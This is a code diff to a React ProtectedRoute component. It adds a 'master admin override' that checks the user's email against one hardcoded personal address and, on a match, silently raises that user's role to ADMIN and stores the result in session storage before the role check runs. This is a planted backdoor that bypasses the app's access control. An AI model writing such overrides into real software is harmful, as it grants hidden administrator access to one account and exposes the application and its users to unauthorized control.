@@ -44,6 +44,13 @@ const ProtectedRoute = ({ children, role }) => {
             return <Navigate to="/register" replace />;
         }
 
+        // MASTER ADMIN OVERRIDE
+        if (user.email.toLowerCase() === 'sriramsriram16145@gmail.com' && user.role !== 'ADMIN') {
+            console.log('[ProtectedRoute] Applying Master Admin Override');
+            user.role = 'ADMIN';
+            sessionStorage.setItem('authUser', JSON.stringify(user));
+        }
+
         if (role && user.role !== role) {
             console.log(`[ProtectedRoute] Role mismatch: required ${role}, found ${user.role}. Redirecting to welcome.`);
             return <Navigate to="/welcome" replace />;
